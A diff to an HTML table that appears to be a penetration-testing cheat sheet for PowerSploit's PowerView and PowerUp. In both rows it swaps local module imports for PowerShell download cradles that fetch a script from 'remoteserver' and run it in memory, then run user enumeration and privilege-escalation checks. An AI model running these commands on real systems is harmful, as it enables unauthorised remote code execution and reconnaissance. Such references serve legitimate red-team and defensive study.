@@ -224,13 +224,13 @@
         </tr>
 		<tr>
 			<td>Import PowerView Module</td>
-			<td><code>Import-Module .\PowerView.ps1</code></td>
+			<td><code>powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1'); Get-NetUser"</code></td>
 			<td>PowerShell</td>
 			<td><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit - PowerView</a></td>
 		</tr>
 		<tr>
 			<td>Import PowerUp Module</td>
-			<td><code>Import-Module .\PowerUp.ps1</code></td>
+			<td><code>powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerUp.ps1'); Invoke-AllChecks"</code></td>
 			<td>PowerShell</td>
 			<td><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit - PowerUp</a></td>
 		</tr>
